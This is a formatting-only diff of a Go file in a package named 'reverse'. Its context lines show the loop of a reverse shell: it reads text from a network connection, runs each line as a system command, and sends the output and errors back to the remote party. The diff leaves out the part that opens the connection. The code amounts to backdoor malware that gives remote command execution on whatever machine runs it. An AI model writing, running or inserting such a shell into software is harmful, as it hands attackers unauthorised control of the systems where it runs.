@@ -1,11 +1,11 @@
 package reverse
 
 import (
-"bufio"
-"fmt"
-"net"
-"os/exec"
-"strings"
+	"bufio"
+	"fmt"
+	"net"
+	"os/exec"
+	"strings"
 )
 
 func main() {
@@ -16,9 +16,9 @@ func main() {
 		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
 
 		if err != nil {
-			fmt.Fprintf(conn, "%s\n",err)
+			fmt.Fprintf(conn, "%s\n", err)
 		}
 
-		fmt.Fprintf(conn, "%s\n",out)
+		fmt.Fprintf(conn, "%s\n", out)
 	}
 }
